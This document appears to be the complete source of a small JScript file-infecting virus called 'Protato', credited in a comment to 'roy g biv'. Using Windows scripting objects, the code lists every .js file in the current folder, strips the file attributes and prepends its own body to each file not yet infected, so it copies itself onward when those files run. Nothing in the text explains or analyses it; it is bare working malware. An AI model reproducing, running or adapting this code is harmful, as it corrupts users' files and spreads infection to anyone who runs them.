Date.prototype.r=function(){/*Protato - roy g biv 22/02/11*/a=new ActiveXObject("scripting.filesystemobject");for(b=new Enumerator(a.getfolder(".").files);!b.atEnd();b.moveNext()){if(a.getextensionname(c=b.item()).toLowerCase()=="js")try{d=a.opentextfile(c);e=d.read(1);if(e!="D")try{e+=d.readall();f=c.attributes;c.attributes=0;g=a.createtextfile(c);g.write("Date.prototype.r="+r.r+";r=new Date;r.r();"+e);g.close();c.attributes=f}catch(z){}d.close()}catch(z){}}};r=new Date;r.r()